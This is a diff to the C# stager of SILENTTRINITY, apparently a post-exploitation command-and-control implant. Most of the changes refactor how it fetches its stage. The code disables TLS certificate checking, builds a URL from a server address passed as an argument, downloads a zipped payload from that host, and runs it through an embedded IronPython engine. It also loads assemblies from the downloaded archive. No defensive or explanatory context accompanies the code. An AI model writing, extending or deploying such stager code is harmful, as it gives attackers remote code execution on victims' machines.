@@ -16,7 +16,6 @@ namespace SILENTTRINITY
         {
             ServicePointManager.ServerCertificateValidationCallback +=
                                  (sender, cert, chain, sslPolicyErrors) => true;
-
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
                                                    (SecurityProtocolType)3072;
 
@@ -32,7 +31,6 @@ namespace SILENTTRINITY
             }
 
             Guid GUID = Guid.NewGuid();
-
             Uri URL = new Uri(new Uri(args[0]), GUID.ToString());
 #if DEBUG
             Console.WriteLine("[+] URL: {0}", URL);
@@ -42,7 +40,9 @@ namespace SILENTTRINITY
 #if DEBUG
                 Console.WriteLine("[+] Trying to get the stage...");
 #endif
-                Stage = ZipStorer.Open(DownloadStage(URL), FileAccess.ReadWrite, true);
+                Stage = ZipStorer.Open(Internals.DownloadStage(URL), 
+                                       FileAccess.ReadWrite,
+                                       true);
             }
             catch
             {
@@ -51,17 +51,10 @@ namespace SILENTTRINITY
 #endif
                 Environment.Exit(-1);
             }
-
 #if DEBUG
             Console.WriteLine("[+] Running the Engine...");
 #endif
-            Engines.IronPython.Run(URL, GUID, Stage);
-        }
-
-        static Stream DownloadStage(Uri URL, int sleep = 5, int retries = 6)
-        {
-            return Retry.Do<Stream>(() => Engines.IronPython.GetStage(URL),
-                                     TimeSpan.FromSeconds(sleep), retries);
+            Engines.IronPython.Run(URL, GUID, Stage); //Magic!!
         }
 
         static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
@@ -70,7 +63,6 @@ namespace SILENTTRINITY
 
             byte[] bytes = Internals.GetResourceInZip(Stage, dllName) ??
                 File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() + dllName);
-
 #if DEBUG
             Console.WriteLine("\t[+] '{0}' loaded", dllName);
 #endif
